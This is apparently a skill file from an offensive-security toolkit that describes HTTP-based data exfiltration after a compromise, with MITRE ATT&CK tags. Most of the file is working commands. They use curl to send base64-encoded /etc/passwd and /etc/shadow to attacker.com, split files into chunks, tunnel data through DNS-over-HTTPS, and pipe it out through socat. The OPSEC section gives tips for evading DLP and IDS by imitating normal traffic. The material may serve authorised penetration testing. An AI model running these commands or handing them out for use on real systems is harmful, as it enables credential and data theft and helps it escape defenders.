---
name: data-exfil-http
description: Exfiltrate data via HTTP POST to attacker-controlled server
version: 1.0.0
phase: post
category: post-exploitation
tags: [exfiltration, http, post, base64, covert-channel]
tools: [curl, socat]
difficulty: basic
opsec_level: high
time_estimate: 1m
severity_if_found: critical
related_skills:
  - data-exfil-dns
  - credential-harvest
mitre_attack:
  - T1048.003
  - T1041
---

## When to Use

Use this skill to verify that data can be exfiltrated over HTTP/HTTPS to an
attacker-controlled server. This confirms the attacker can extract stolen data
from the compromised network.

## Prerequisites

- curl or wget
- Outbound HTTP/HTTPS access
- Attacker-controlled listening server

## Procedure

```bash
# 1. Test basic HTTP exfiltration with GET
curl -sk "https://attacker.com/exfil?data=$(echo 'test-payload' | base64)"

# 2. POST exfiltration with base64-encoded data
curl -sk -X POST "https://attacker.com/exfil" \
  -H "Content-Type: application/octet-stream" \
  -d @- <<< "$(cat /etc/passwd | base64)"

# 3. Exfiltrate file with custom headers (mimic legitimate traffic)
curl -sk -X POST "https://attacker.com/api/upload" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0" \
  -d "{\"file\":\"$(cat /etc/shadow | base64)\",\"name\":\"backup.dat\"}"

# 4. Chunked exfiltration for large files
FILE="/etc/passwd"
CHUNK_SIZE=1024
OFFSET=0
while [ $OFFSET -lt $(wc -c < $FILE) ]; do
  dd if=$FILE bs=1 skip=$OFFSET count=$CHUNK_SIZE 2>/dev/null | \
    base64 | curl -sk -X POST "https://attacker.com/exfil" -d @- -H "X-Chunk: $OFFSET"
  OFFSET=$((OFFSET + CHUNK_SIZE))
done

# 5. Exfiltrate via DNS-over-HTTPS (bypass DNS monitoring)
curl -sk -X POST "https://dns.google/resolve" \
  -H "Content-Type: application/dns-json" \
  -d "{\"type\":\"TXT\",\"name\":\"$(echo 'secret' | base64).exfil.attacker.com\"}"

# 6. Test HTTPS tunnel (socat reverse tunnel)
# On attacker: socat TCP-LISTEN:4444,reuseaddr STDOUT > received.txt
# On compromised host:
cat /etc/passwd | socat - TCP4:attacker.com:4444

# 7. Verify data received on attacker server
# Check web server access logs or socat output
```

## OPSEC Rules

- **HIGH RISK**: HTTP exfiltration is detectable by DLP and IDS
- Use HTTPS to encrypt exfiltrated data in transit
- Mimic legitimate User-Agent and headers
- Limit exfil size — test with /etc/passwd only
- Do not exfiltrate during business hours if stealth is required
- Clean up any temporary files created during testing

## Verification

- Confirm data arrives at attacker-controlled server
- Check if proxy or firewall blocks outbound HTTPS
- Verify data integrity (compare sent vs. received)
- Test different ports (443, 8443, 8080) if one is blocked

## Pitfalls

- DLP solutions may detect and block base64-encoded data
- Proxy servers may log and inspect HTTPS traffic (TLS interception)
- Some networks block outbound connections on non-standard ports
- Large exfiltrations will trigger anomaly detection
- Web application firewalls may block unusual POST patterns
- ICMP and DNS may be blocked as exfil channels

## Output Format

```
[EXFIL-HTTP] HTTP exfiltration successful
  Method: POST to https://attacker.com/api/upload
  Data: /etc/passwd (1.2KB, base64 encoded)
  Response: 200 OK
  Severity: CRITICAL

[TUNNEL] Socat reverse tunnel established
  Port: 4444
  Direction: compromised → attacker
  Severity: HIGH
```
